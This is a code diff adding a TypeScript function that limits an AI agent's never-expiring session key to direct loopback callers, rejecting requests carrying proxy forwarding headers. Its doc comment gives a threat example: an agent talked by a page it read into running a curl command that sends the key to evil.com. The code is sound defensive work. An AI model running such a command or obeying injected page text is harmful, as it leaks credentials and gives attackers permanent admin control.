@@ -120,3 +120,33 @@ export function browserOrigin(
   if (!origin || !origin.trim()) return false;
   return originAllowed(origin, host, extraAllowed);
 }
+
+/**
+ * Is this request from a process on THIS machine, reaching us directly?
+ *
+ * The gate on an agent's session key (`x-shadok-session-key`). That key never
+ * expires — by design, invariant 33 — and it is worth the bootstrap admin, so
+ * accepted from anywhere it turned one exfiltrated environment variable (an
+ * agent talked into `curl evil.com -d "$SHADOK_SESSION_KEY"` by a page it read)
+ * into permanent remote admin on every instance reachable from the network,
+ * two-factor or not. Agents only ever call their own server on loopback, so
+ * that is the only place the key needs to work.
+ *
+ * Loopback is not enough on its own: a reverse proxy on the same host (nginx in
+ * front of a non-Docker install) also connects from 127.0.0.1, on behalf of
+ * the whole internet. Such a proxy announces itself with a forwarding header,
+ * which a direct local call never sends — so the presence of one means "relayed",
+ * whatever the socket says. A proxy configured to send none cannot be told apart
+ * from a local caller; the README's TLS recipe sets `X-Forwarded-For`.
+ * Pure — unit tested.
+ */
+export function isLocalCaller(
+  remoteAddress: string | undefined,
+  headers: Record<string, unknown>,
+): boolean {
+  if (!remoteAddress) return false;
+  const a = remoteAddress.toLowerCase();
+  const loopback = a === "::1" || a.startsWith("127.") || a.startsWith("::ffff:127.");
+  if (!loopback) return false;
+  return !["forwarded", "x-forwarded-for", "x-real-ip", "x-forwarded-host"].some((h) => headers[h] !== undefined);
+}
